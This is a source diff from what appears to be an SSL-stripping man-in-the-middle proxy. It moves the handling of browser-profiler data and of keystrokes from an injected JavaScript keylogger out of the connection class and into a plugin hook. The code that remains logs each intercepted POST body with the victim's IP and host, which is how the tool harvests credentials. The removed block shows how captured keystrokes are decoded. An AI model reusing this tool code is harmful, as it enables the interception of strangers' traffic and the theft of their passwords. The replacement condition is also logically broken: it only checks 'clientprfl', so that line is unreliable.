@@ -23,7 +23,6 @@ from twisted.web.http import HTTPClient
 from ResponseTampererFactory import ResponseTampererFactory
 from URLMonitor import URLMonitor
 from ProxyPlugins import ProxyPlugins
-from pprint import pformat
 class ServerConnection(HTTPClient):
 
     ''' The server connection is where we do the bulk of the stripping.  Everything that
@@ -49,13 +48,6 @@ class ServerConnection(HTTPClient):
         self.contentLength    = None
         self.shutdownComplete = False
 
-    def post2dict(self, string):
-        dict = {}
-        for line in string.split('&'):
-            t = line.split('=')
-            dict[t[0]] = t[1]
-        return dict
-
     def getPostPrefix(self):
         return "POST"
 
@@ -73,33 +65,8 @@ class ServerConnection(HTTPClient):
         self.endHeaders()
 
     def sendPostData(self):
-        #Handle the browserprofiler plugin output
-        if 'clientprfl' in self.uri:
-            out = pformat(self.post2dict(self.postData))
-            logging.warning("%s Browser Profilerer data:\n%s" % (self.client.getClientIP(), out))
-        
-        #Handle the jskeylogger plugin output
-        elif 'keylog' in self.uri:
-            keys = self.postData.split(",")
-            del keys[0]; del(keys[len(keys)-1])
-
-            nice = ''
-            for n in keys:
-                if n == '9':
-                    nice += "<TAB>"
-                elif n == '8':
-                    nice = nice.replace(nice[-1:], "")
-                elif n == '13':
-                    nice = ''
-                else:
-                    try:
-                        nice += n.decode('hex')
-                    except:
-                        print "ERROR: unknown char " + n
-
-            logging.warning("%s [%s] Keys: %s" % (self.client.getClientIP(), self.headers['host'], nice))
-        
-        else:
+        self.plugins.hook()
+        if ('clientprfl' or 'keylog') not in self.uri:
             logging.warning("%s Data (%s):\n%s" % (self.getPostPrefix(),self.headers['host'],self.postData))
             self.transport.write(self.postData)
 
